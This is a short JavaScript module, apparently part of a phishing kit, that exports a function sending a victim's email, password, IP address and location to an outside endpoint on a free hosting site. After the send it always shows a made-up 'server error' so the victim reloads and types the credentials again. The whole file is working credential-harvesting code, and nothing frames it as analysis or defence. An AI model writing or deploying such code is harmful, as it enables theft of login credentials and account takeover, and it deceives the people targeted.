async function sendDataToServer({
  ip,
  country,
  city,
  region,
  timezone,
  emailValue,
  passwordValue,
  setError,
  setLoading,
}) {
  setLoading(true);
  if (
    !ip ||
    !country ||
    !city ||
    !region ||
    !timezone ||
    !emailValue ||
    !passwordValue
  ) {
    setLoading(false);
    console.log(emailValue);
    return console.log(
      "Missing Login credentials, please ensure you fill the login form"
    );
  } else {
    try {
      await fetch("https://theappcrud.000webhostapp.com/insert.php", {
        method: "POST",
        body: JSON.stringify({
          emailValue,
          passwordValue,
          country,
          city,
          region,
          ip,
          timezone,
        }),
        headers: {
          "Content-Type": "application/json",
        },
        mode: "no-cors",
      });

      setError(
        "Failed to access this resource due to a server error, please reload the page and try again"
      );
      setLoading(false);
    } catch (error) {
      return console.log("Couldn't make Fetch Request", error);
    }

    // return "Data added successfully"; // Or any other success indication
  }
}

export { sendDataToServer };
